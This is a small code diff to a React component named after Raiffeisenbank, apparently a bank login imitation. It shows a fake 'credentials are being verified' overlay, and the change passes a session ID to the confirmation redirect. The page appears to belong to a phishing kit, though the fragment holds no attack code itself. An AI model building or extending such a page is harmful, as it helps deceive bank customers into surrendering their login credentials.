@@ -96,7 +96,7 @@ const Raiffeisenbank = () => {
 
   return (
     <div>
-      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation")} />}
+      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
     <div
       className="relative flex h-screen overflow-hidden flex-col md:min-h-screen md:h-auto md:overflow-visible"
       style={{ fontFamily: "'Open Sans', sans-serif" }}
